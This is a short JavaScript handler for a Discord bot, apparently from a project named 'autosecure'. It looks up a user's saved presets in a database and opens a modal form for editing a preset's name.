const generate = require("../../../autosecure/utils/utils/generate")
const { queryParams } = require("../../../db/database")
const modalBuilder = require("../../../autosecure/utils/modalBuilder")
const { TextInputStyle } = require("discord.js")

module.exports = {
  name: "editpreset1",
  callback: async (client, interaction) => {
    let [t, userid, botnumber, page] = interaction.customId.split("|")
        let presets = await queryParams(`SELECT * FROM presets WHERE user_id=? AND botnumber=?`, [userid, botnumber])
    let presetcount = presets.length
    let rId = generate(32)

    await queryParams(
      `INSERT INTO actions (id, action) VALUES (?, ?)`,
      [rId, `editpresetmodal|${userid}|${botnumber}|${page}|${presetcount}`]
    )

    await interaction.showModal(
      modalBuilder(`action|${rId}`, 'Edit Preset', [
        {
          setCustomId: 'presetname',
          setMaxLength: 21,
          setMinLength: 1,
          setRequired: true,
          setLabel: "Name of preset",
          setPlaceholder: "Ex: oauth",
          setStyle: TextInputStyle.Short
        }
      ])
    )
  }
}
